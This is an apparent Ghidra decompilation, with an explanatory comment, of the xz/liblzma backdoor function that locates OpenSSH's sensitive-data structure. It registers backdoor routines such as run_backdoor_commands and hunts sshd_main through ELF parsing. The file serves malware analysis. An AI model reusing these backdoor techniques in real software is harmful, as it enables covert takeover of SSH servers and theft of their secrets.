// /home/kali/xzre-ghidra/xzregh/105410_sshd_find_sensitive_data.c
// Function: sshd_find_sensitive_data @ 0x105410
// Calling convention: unknown
// Prototype: undefined sshd_find_sensitive_data(void)


/*
 * AutoDoc: Bootstraps the entire sensitive-data discovery pipeline: emits bookkeeping entries for the
 * secret-data mirroring code, allocates libcrypto stubs (EVP_DigestVerify*, EVP_CIPHER_CTX_new,
 * EVP_chacha20), finds `sshd_main`/`uses_endbr64`, gathers code/data segment bounds, and runs
 * both the xcalloc and KRB5CCNAME heuristics. It scores whichever pointers were found, keeps the
 * higher-confidence candidate, and writes it into `ctx->sshd_sensitive_data` before returning
 * success.
 */
#include "xzre_types.h"


undefined8
sshd_find_sensitive_data
          (undefined8 param_1,long *param_2,undefined8 param_3,long param_4,uint *param_5)

{
  long lVar1;
  int iVar2;
  int iVar3;
  uint uVar4;
  uint uVar5;
  long lVar6;
  long lVar7;
  long lVar8;
  long lVar9;
  long lVar10;
  long lVar11;
  undefined8 extraout_RDX;
  undefined8 extraout_RDX_00;
  undefined8 uVar12;
  code **ppcVar13;
  byte bVar14;
  long winning_candidate;
  long local_b0;
  long local_a8;
  long local_a0;
  long local_98;
  long local_90;
  code *local_88;
  undefined8 local_80;
  undefined8 local_78;
  code *local_70;
  undefined8 local_68;
  undefined8 local_60;
  code *local_58;
  undefined8 local_50;
  undefined8 local_48;
  code *local_40;
  undefined8 local_38;
  undefined8 local_30;
  
  bVar14 = 0;
  iVar2 = secret_data_append_from_address(0,0x1c8,0,0x1d);
  if (iVar2 == 0) {
    return 0;
  }
  local_68 = 0x1b000001c8;
  local_88 = sshd_proxy_elevate;
  local_80 = 0x1c000001c8;
  local_70 = run_backdoor_commands;
  local_78 = 0x100000000;
  local_60 = 0x100000000;
  local_58 = sshd_get_usable_socket;
  local_50 = 0x1a000001c3;
  local_48 = 0x100000005;
  local_40 = sshd_get_client_socket;
  local_38 = 0x19000001bd;
  local_30 = 0x100000006;
  iVar2 = secret_data_append_items(&local_88,4,secret_data_append_item);
  if (iVar2 == 0) {
    return 0;
  }
  ppcVar13 = &local_88;
  for (lVar11 = 0x18; lVar11 != 0; lVar11 = lVar11 + -1) {
    *(undefined4 *)ppcVar13 = 0;
    ppcVar13 = (code **)((long)ppcVar13 + (ulong)bVar14 * -8 + 4);
  }
  winning_candidate = 0;
  local_b0 = 0;
  local_a8 = 0;
  local_a0 = 0;
  local_98 = 0;
  local_90 = 0;
  lVar11 = get_lzma_allocator(1);
  *(long **)(lVar11 + 0x10) = param_2;
  lVar6 = lzma_alloc(0x118,lVar11);
  *(long *)(param_4 + 0x80) = lVar6;
  if (lVar6 != 0) {
    *(int *)(param_4 + 0x120) = *(int *)(param_4 + 0x120) + 1;
  }
  lVar7 = elf_get_code_segment(param_1,&winning_candidate);
  lVar6 = winning_candidate;
  if (lVar7 == 0) {
    return 0;
  }
  lVar8 = elf_symbol_get(param_2,0x408,0);
  lVar9 = elf_symbol_get(param_2,0x188,0);
  if (lVar9 == 0) {
    return 0;
  }
  lVar10 = elf_get_data_segment(param_1,&local_b0,0);
  lVar9 = local_b0;
  if (lVar10 == 0) {
    return 0;
  }
  if (lVar8 != 0) {
    lVar8 = *(long *)(lVar8 + 8);
    lVar1 = *param_2;
    *(int *)(param_4 + 0x120) = *(int *)(param_4 + 0x120) + 1;
    *(long *)(param_4 + 0x88) = lVar8 + lVar1;
  }
  lVar8 = lzma_alloc(0x838,lVar11);
  *(long *)(param_4 + 0xa0) = lVar8;
  if (lVar8 != 0) {
    *(int *)(param_4 + 0x120) = *(int *)(param_4 + 0x120) + 1;
  }
  iVar2 = sshd_find_main(&local_a8,param_1,param_2,param_4);
  lVar8 = local_a8;
  if (iVar2 == 0) {
    return 0;
  }
  *(long *)(param_5 + 0x1e) = local_a8;
  iVar2 = is_endbr64_instruction(local_a8,local_a8 + 4,0xe230);
  *param_5 = (uint)(iVar2 != 0);
  lVar1 = lVar7 + lVar6;
  if ((iVar2 != 0) &&
     (iVar2 = find_function(lVar8,0,&local_a0,lVar8,lVar7 + lVar6,1), lVar1 = local_a0, iVar2 == 0))
  {
    return 0;
  }
  local_a0 = lVar1;
  uVar12 = param_1;
  iVar2 = sshd_get_sensitive_data_address_via_xcalloc
                    (lVar10,lVar9 + lVar10,lVar8,local_a0,param_3,&local_90,param_1,param_5);
  iVar3 = sshd_get_sensitive_data_address_via_krb5ccname
                    (lVar10,lVar9 + lVar10,lVar8,local_a0,&local_98,param_1);
  lVar7 = lzma_alloc(0xc28,lVar11);
  lVar6 = local_90;
  *(long *)(param_4 + 200) = lVar7;
  if (lVar7 != 0) {
    *(int *)(param_4 + 0x120) = *(int *)(param_4 + 0x120) + 1;
  }
  if (iVar2 == 0) {
LAB_00105772:
    if (iVar3 == 0) goto LAB_001057d3;
    uVar4 = 0;
LAB_001057a6:
    uVar5 = sshd_get_sensitive_data_score(local_98,param_1,param_3,param_5);
    uVar12 = extraout_RDX_00;
  }
  else {
    if (iVar3 != 0) {
      if (local_90 == local_98) {
        uVar4 = sshd_get_sensitive_data_score(local_90,param_1,param_3,param_5);
        if (uVar4 < 8) {
          return 0;
        }
        goto LAB_0010575e;
      }
      uVar4 = sshd_get_sensitive_data_score(local_90,param_1,param_3,param_5);
      goto LAB_001057a6;
    }
    if (iVar2 == 0) goto LAB_00105772;
    uVar4 = sshd_get_sensitive_data_score(local_90,param_1,param_3,param_5);
    uVar5 = 0;
    uVar12 = extraout_RDX;
  }
  if (((uVar5 <= uVar4) && (lVar6 = local_90, 7 < uVar4)) ||
     ((uVar4 <= uVar5 && (lVar6 = local_98, 7 < uVar5)))) {
LAB_0010575e:
    *(long *)(param_5 + 10) = lVar6;
    return 1;
  }
LAB_001057d3:
  lzma_free(*(undefined8 *)(param_4 + 0x80),lVar11,uVar12);
  lzma_free(*(undefined8 *)(param_4 + 0xa0),lVar11);
  lzma_free(*(undefined8 *)(param_4 + 200),lVar11);
  return 0;
}

